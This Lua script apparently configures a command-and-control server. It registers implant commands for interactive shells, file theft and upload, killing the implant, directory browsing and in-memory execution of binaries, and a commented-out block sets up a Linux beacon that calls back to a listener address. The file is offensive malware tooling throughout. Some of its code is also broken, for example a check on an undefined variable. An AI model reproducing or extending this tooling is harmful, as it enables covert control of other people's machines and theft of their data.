CODE = {
    PING = 1,
    SSH = 2,
    DOWN = 3,
    UPL = 4,
    KILL = 5,
    CD = 6,
    PWD = 7,
    LS = 8,
    MEMEXEC = 9
}

function ping(payload)
    print("command ping from script args", payload)
    local err = add_task(CODE.PING, payload)
    if err then
        print("Error")
    end
end

function ssh(payload)
    print("command ssh from script with args", payload)
    local err = add_task(CODE.SSH, payload)
    if err then
        print("Error")
    end
end

function download(payload)
    print("command download from script with args", payload)
    local err = add_task(CODE.DOWN, payload)
    if err then
        print("Error")
    end
end

function upload(payload)
    local c = 0
    local lcs = {}
    for token in string.gmatch(payload, "[^%s]+") do 
        lcs[c] = token
        c=c+1
    end
    if #lcs ~= 1 then
        print("problem")
        return
    end

    local err = add_task_upload_file(CODE.UPL, lcs[0], lcs[1])
    if err then
        print("Error")
    end
end

function upload2(payload)
    opts = {}
    -- = "s=/tmp/image.png d=Lua"
    for k, v in string.gmatch(payload, "(%w+)=([%w/.]+)") do
        opts[k] = v
    end

    if not t.s or not t.d then
        print("problem")
        return
    end

    local err = add_task_upload_file(CODE.UPL, opts.s, opts.d)
    if err then
        print("Error")
    end
end

function kill(payload)
    print("command kill from script with args", payload)
    local err = add_task(CODE.KILL, payload)
    if err then
        print("Error")
    end
end

function pwd(payload)
    local err = add_task(CODE.PWD, payload)
    if err then
        print("Error")
    end
end

function cd(payload)
    local err = add_task(CODE.CD, payload)
    if err then
        print("Error")
    end
end

function ls(payload)
    local err = add_task(CODE.LS, payload)
    if err then
        print("Error")
    end
end

function memexec(payload)
    local c = 0
    local lcs = {}
    for token in string.gmatch(payload, "[^%s]+") do 
        lcs[c] = token
        c=c+1
    end
    if #lcs ~= 1 then
        print("problem")
        return
    end

    local err = add_task_upload_file(CODE.MEMEXEC, lcs[0], lcs[1])
    if err then
        print("Error")
    end
end


--[[
implant_register_profile("linux-beacon", {
    lhost    = "10.0.0.1:4444",
    os       = "linux",
    arch     = "amd64",
    uri      = "/beacon",
    output   = "beacon",
    template = "./template",
})
]]

--[[
The first argument of "command("impl","ping","Ping the implant", ping)" is the type of implant. Since the
C2 may be dealing with many times of implants that must be different (windows implant, linux, IoT), 
it is used for the C2 show commands that are handled by that type of implant (impl in this case).
So just command handled by the impl implant type will be shown to the used, when interacting
with a impl implant type.

The implant must presents itself's type
]]

-- type, name, desc, func
command("impl","ping","Ping the implant", ping)
command("impl","ssh","Get an interactive session", ssh)
command("impl","download","Download a file", download)
command("impl","upload","upload a file", upload)
command("impl","kill","Kill implant", kill)
command("impl","pwd","Get working dir", pwd)
command("impl","cd","Change dir", cd)
command("impl","ls","List dir", ls)
command("impl","memexec","Execute binary in memory", memexec)

--[[
function OnRegister(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
end

function OnCheck(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("data:", args[5])
    print("task:", args[6])
end

function OnResponse(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("response:", args[5])
    print("task:", args[6])
end
]]

function Main()
end
